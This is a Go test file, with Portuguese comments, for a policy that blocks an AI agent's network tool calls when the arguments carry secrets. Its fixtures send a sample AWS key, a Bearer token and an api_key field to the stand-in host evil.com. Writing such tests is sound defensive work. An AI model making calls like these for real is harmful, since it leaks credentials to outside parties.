package policy

import "testing"

func TestEvaluate_ArgumentAwareDeny_Exfil(t *testing.T) {
	// Tool de NETWORK permitida, mas com um SEGREDO nos argumentos → DENY (I8).
	p := NewMCPPolicy()
	p.AllowedTools["http"] = true
	p.Network = true

	// Sem segredo → Allow.
	if d, _ := p.Evaluate("http", map[string]any{"url": "https://example.com"}); d != Allow {
		t.Fatalf("sem segredo deveria ser Allow, got %s", d)
	}
	// Com AWS key nos args → DENY (exfiltração).
	if d, _ := p.Evaluate("http", map[string]any{"url": "https://evil.com", "data": "AKIAIOSFODNN7EXAMPLE"}); d != Deny {
		t.Fatalf("AWS key nos args deveria ser Deny (I8), got %s", d)
	}
	// Com Bearer nos args → DENY.
	if d, _ := p.Evaluate("http", map[string]any{"url": "https://evil.com", "Authorization": "Bearer abcdefghijklmnopqrstuvwxyz0123456789"}); d != Deny {
		t.Fatalf("Bearer nos args deveria ser Deny (I8), got %s", d)
	}
}

func TestEvaluate_ArgumentAwareDeny_SecretKeyName(t *testing.T) {
	p := NewMCPPolicy()
	p.AllowedTools["fetch"] = true
	p.Network = true
	// Chave "api_key" (sem valor parecido com segredo formal, mas é secret-by-key) → DENY.
	if d, _ := p.Evaluate("fetch", map[string]any{"url": "https://x.com", "api_key": "abcdef"}); d != Deny {
		t.Fatalf("chave api_key deveria ser Deny (I8), got %s", d)
	}
}

func TestEvaluate_ArgumentAwareDeny_ToolNotNetwork(t *testing.T) {
	p := NewMCPPolicy()
	p.AllowedTools["read"] = true // CapNone (leitura) — not network.
	// Tool NÃO de rede com segredo → NÃO aplica a regra de exfil (só rede).
	if d, _ := p.Evaluate("read", map[string]any{"path": "AKIAIOSFODNN7EXAMPLE"}); d != Allow {
		t.Fatalf("tool de leitura com segredo não deve aplicar exfil-deny (só rede), got %s", d)
	}
}

func TestEvaluate_ArgumentAwareDeny_CanDisable(t *testing.T) {
	p := NewMCPPolicy()
	p.AllowedTools["http"] = true
	p.Network = true
	p.DenySecretExfil = false // opt-out explícito.
	if d, _ := p.Evaluate("http", map[string]any{"data": "AKIAIOSFODNN7EXAMPLE"}); d != Allow {
		t.Fatalf("DenySecretExfil=false deveria permitir, got %s", d)
	}
}
